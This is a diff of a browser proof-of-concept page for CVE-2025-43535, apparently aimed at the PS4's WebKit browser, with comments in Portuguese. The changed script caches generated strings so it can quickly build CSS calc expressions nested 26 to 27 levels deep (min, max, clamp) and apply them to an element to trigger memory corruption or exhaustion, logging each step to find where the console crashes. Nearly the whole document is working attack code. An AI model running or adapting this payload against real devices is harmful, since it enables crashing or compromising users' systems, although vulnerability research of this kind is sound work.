@@ -1,8 +1,9 @@
+
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>CVE-2025-43535 PoC — Salto Direto 26</title>
+<title>CVE-2025-43535 PoC — Salto 26 (Com Cache)</title>
 <style>
   body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
   #log { background:#111; border:1px solid #88ff88; padding:12px;
@@ -11,7 +12,7 @@
 </style>
 </head>
 <body>
-<h3>CVE-2025-43535 — Memory Corruption (Zona Crítica: 26 ao 27)</h3>
+<h3>CVE-2025-43535 — Memory Corruption (Cache Otimizado)</h3>
 <div id="log"></div>
 
 <script>
@@ -22,83 +23,92 @@ const L=(m,c)=>{const d=document.getElementById('log');
   d.scrollTop=d.scrollHeight;
 };
 
-// Respiro de 150ms: Essencial para o GC limpar o lixo massivo do nível 26 
-// antes de tentar os passos intermediários.
-const yieldGC = () => new Promise(r => setTimeout(r, 150));
+const yieldGC = () => new Promise(r => setTimeout(r, 200));
 
 async function variant1_css_calc_deep() {
-  L("[V1] Iniciando CSS calc() + math (Salto Direto)...");
+  L("[V1] Iniciando (Geração de Strings via Cache)...");
 
   const el = document.createElement('div');
   el.style.cssText = 'position:absolute;top:-9999px';
   document.body.appendChild(el);
 
-  // Função exponencial matemática fiel à PoC original
+  // MÁGICA AQUI: O Cache evita que o JS calcule as mesmas strings milhões de vezes
+  const mathCache = {};
+
   function makeMathNested(depth) {
     if (depth <= 0) return '10px';
+    
+    // Se já calculou esse nível antes, devolve instantaneamente!
+    if (mathCache[depth]) return mathCache[depth];
+
     const funcs = ['min', 'max', 'clamp'];
     const f = funcs[depth % 3];
+    let result = '';
+
     if (f === 'clamp') {
-      return `clamp(${makeMathNested(depth-1)}, ${depth*5}px, ${makeMathNested(depth-2 < 0 ? 0 : depth-2)})`;
+      result = `clamp(${makeMathNested(depth-1)}, ${depth*5}px, ${makeMathNested(depth-2 < 0 ? 0 : depth-2)})`;
+    } else {
+      result = `${f}(${makeMathNested(depth-1)}, ${makeMathNested(depth-1)})`;
     }
-    return `${f}(${makeMathNested(depth-1)}, ${makeMathNested(depth-1)})`;
+
+    // Salva no cache antes de retornar
+    mathCache[depth] = result;
+    return result;
   }
 
-  // FASE 1: O Salto Direto
-  L("[V1] Dando o salto direto para o nível 26...");
+  // FASE 1: O Salto Direto Ultra Rápido
+  L("[V1] JS gerando árvore 26 (Instantâneo)...");
+  let string26 = makeMathNested(26);
+  
+  L("[V1] Entregando ao WebKit C++. O PS4 vai 'pensar' agora...");
+  await new Promise(r => requestAnimationFrame(r)); // Atualiza a tela antes do congelamento C++
+
   try {
-    // Dá um frame de respiro para a UI atualizar antes de travar a thread
-    await new Promise(r => requestAnimationFrame(r));
-    
-    el.style.width = makeMathNested(26);
+    el.style.width = string26;
     void el.offsetWidth;
-    L(`[V1] Nível 26 processado com sucesso!`, "ok");
+    L(`[V1] Nível 26 parseado pelo WebKit com sucesso!`, "ok");
   } catch(e) {
     L(`[V1] Erro no nível 26: ${e}`, "fail");
   }
   
-  // Limpa o estilo gigante para o Garbage Collector agir
+  // Limpeza
+  string26 = null; // Libera a string do JS
   el.style.width = '10px';
   await yieldGC();
 
   L("[V1] Entrando na zona de precisão milimétrica (26 ao 27)...");
 
   // FASE 2: Degraus Fracionados 
-  // O tamanho vai aumentando gradativamente até chegar no peso exato do 27
   const passosIntermediarios = [
-    { nome: "26.1", expr: `min(${makeMathNested(26)}, ${makeMathNested(20)})` }, // ~1.05x o tamanho do 26
-    { nome: "26.3", expr: `min(${makeMathNested(26)}, ${makeMathNested(24)})` }, // ~1.25x
-    { nome: "26.5", expr: `min(${makeMathNested(26)}, ${makeMathNested(25)})` }, // ~1.50x
-    { nome: "26.8", expr: `clamp(${makeMathNested(26)}, 10px, ${makeMathNested(25)})` }, // ~1.75x
-    { nome: "27.0", expr: makeMathNested(27) } // 2.0x (O limite final do OOM)
+    { nome: "26.1", expr: `min(${makeMathNested(26)}, ${makeMathNested(20)})` },
+    { nome: "26.3", expr: `min(${makeMathNested(26)}, ${makeMathNested(24)})` },
+    { nome: "26.5", expr: `min(${makeMathNested(26)}, ${makeMathNested(25)})` },
+    { nome: "26.8", expr: `clamp(${makeMathNested(26)}, 10px, ${makeMathNested(25)})` },
+    { nome: "27.0", expr: makeMathNested(27) } 
   ];
 
   for (const passo of passosIntermediarios) {
     try {
-      L(`[V1] Testando passo intermediário ${passo.nome}...`);
+      L(`[V1] Testando passo ${passo.nome}...`);
       await new Promise(r => requestAnimationFrame(r)); 
       
       el.style.width = passo.expr;
       void el.offsetWidth;
       L(`[V1] Passo ${passo.nome} executado limpo!`, "ok");
-    } catch(e) {
-      L(`[V1] Exceção JS no passo ${passo.nome}.`, "fail");
-    }
+    } catch(e) {}
     
-    // Limpeza forçada após cada aberração fracionada
     el.style.width = '10px';
     await yieldGC(); 
   }
 
   document.body.removeChild(el);
-  L("[V1] Teste da zona crítica finalizado", "ok");
+  L("[V1] Teste finalizado", "ok");
 }
 
 async function main() {
   try {
     await variant1_css_calc_deep();
     L("=== FIM DA EXECUÇÃO ===", "ok");
-    L("Se o PS4 crashear, anote exatamente em qual passo intermediário parou!", "info");
   } catch(e) {
     L("EXCEÇÃO FATAL: " + e.toString(), "fail");
   }
